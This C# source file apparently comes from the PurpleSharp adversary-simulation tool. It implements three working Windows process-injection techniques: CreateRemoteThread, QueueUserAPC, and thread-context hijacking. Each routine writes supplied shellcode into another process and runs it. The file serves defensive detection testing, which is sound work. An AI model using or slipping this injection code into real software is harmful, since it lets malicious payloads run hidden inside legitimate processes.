using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PurpleSharp.Simulations
{
    class DefenseEvasionHelper
    {

        const uint MEM_COMMIT = 0x00001000;
        const UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        const UInt32 PAGE_EXECUTE_READ = 0x20;
        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;

        public static void ProcInjection_CreateRemoteThread(byte[] shellcode, Process proc, Lib.Logger logger)
        {
            logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
            IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Int32 size = shellcode.Length;
            logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            IntPtr size2 = new IntPtr(shellcode.Length);
            logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
            bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);
            logger.TimestampInfo(String.Format("Calling CreateRemoteThread on PID:{0}", proc.Id));
            WinAPI.CreateRemoteThread(procHandle, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
        }

        public static void ProcInjection_APC(byte[] shellcode, Process proc, Lib.Logger logger)
        {
            logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
            IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);

            //IntPtr procHandle = WinAPI.OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Int32 size = shellcode.Length;
            logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            UIntPtr bytesWritten;
            IntPtr size2 = new IntPtr(shellcode.Length);
            logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
            bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);
            uint oldProtect = 0;
            bWrite = WinAPI.VirtualProtectEx(procHandle, spaceAddr, shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

            //TODO: do we need to do it for all threads ?
            foreach (ProcessThread thread in proc.Threads)
            {
                IntPtr tHandle = WinAPI.OpenThread(Structs.ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);
                logger.TimestampInfo(String.Format("Calling QueueUserAPC on ThreadId:{0}", thread.Id));
                IntPtr ptr = WinAPI.QueueUserAPC(spaceAddr, tHandle, IntPtr.Zero);
            }
        }

        //credits to https://github.com/pwndizzle/c-sharp-memory-injection
        public static void ProcInjection_ThreadHijack(byte[] shellcode, Process proc, Lib.Logger logger)
        {

            logger.TimestampInfo(String.Format("Calling OpenProcess on PID:{0}", proc.Id));
            IntPtr procHandle = WinAPI.OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc.Id);
            Int32 size = shellcode.Length;
            logger.TimestampInfo(String.Format("Calling VirtualAllocEx on PID:{0}", proc.Id));
            IntPtr spaceAddr = WinAPI.VirtualAllocEx(procHandle, new IntPtr(0), (uint)size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            UIntPtr bytesWritten;
            IntPtr size2 = new IntPtr(shellcode.Length);
            logger.TimestampInfo(String.Format("Calling WriteProcessMemory on PID:{0}", proc.Id));
            bool bWrite = WinAPI.WriteProcessMemory(procHandle, spaceAddr, shellcode, (uint)size2, out bytesWritten);


            // Open and Suspend first thread
            ProcessThread thread = proc.Threads[0];
            IntPtr pOpenThread = WinAPI.OpenThread(Structs.ThreadAccess.THREAD_HIJACK, false, (int)thread.Id);
            logger.TimestampInfo(String.Format("Calling SuspendThread on threadId: {0}", proc.Threads[0].Id));
            WinAPI.SuspendThread(pOpenThread);

            // Get thread context

            Structs.CONTEXT64 tContext = new Structs.CONTEXT64();
            tContext.ContextFlags = Structs.CONTEXT_FLAGS.CONTEXT_FULL;
            
            if (WinAPI.GetThreadContext(pOpenThread, ref tContext))
            {
                logger.TimestampInfo(String.Format("Current EIP: {0}", tContext.Rip));
            }
            
            tContext.Rip = (ulong)spaceAddr.ToInt64();
            logger.TimestampInfo(String.Format("Calling SetThreadContext on threadId:{0}", proc.Threads[0].Id));
            WinAPI.SetThreadContext(pOpenThread, ref tContext);

            /*
            if (!WinAPI.SetThreadContext(pOpenThread, ref tContext))
            {
                Console.WriteLine("Error setting context");
            }
            */
            if (WinAPI.GetThreadContext(pOpenThread, ref tContext))
            {
                logger.TimestampInfo(String.Format("New EIP : {0}", tContext.Rip));
            }
            logger.TimestampInfo(String.Format("Calling ResumeThread on threadId:{0}", proc.Threads[0].Id));
            WinAPI.ResumeThread(pOpenThread);
        }
    }
}
